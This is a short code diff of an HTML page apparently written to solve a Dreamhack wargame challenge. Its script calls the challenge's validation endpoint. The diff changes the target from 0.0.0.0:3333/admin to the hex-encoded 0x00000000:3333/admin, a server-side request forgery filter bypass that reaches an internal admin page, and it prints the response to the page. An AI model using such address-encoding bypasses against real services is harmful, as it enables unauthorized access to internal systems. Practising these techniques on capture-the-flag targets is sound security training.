@@ -10,7 +10,7 @@
         <div id="result-box"></div>
     </h1>
     <script>
-        fetch("http://host3.dreamhack.games:14995/validation?url=0.0.0.0:3333/admin", {
+        fetch("http://host3.dreamhack.games:14995/validation?url=0x00000000:3333/admin", {
             method: 'GET',
             'refer': '192.168.0.1'
         }).then(response => {
@@ -30,7 +30,8 @@
 
                 document.getElementById("result-box").textContent = resValue;
             } else {
-                console.log(htmlString);
+                document.getElementById("result-box").textContent = htmlString;
+                console.log(htmlString)
             }
         })
     </script>
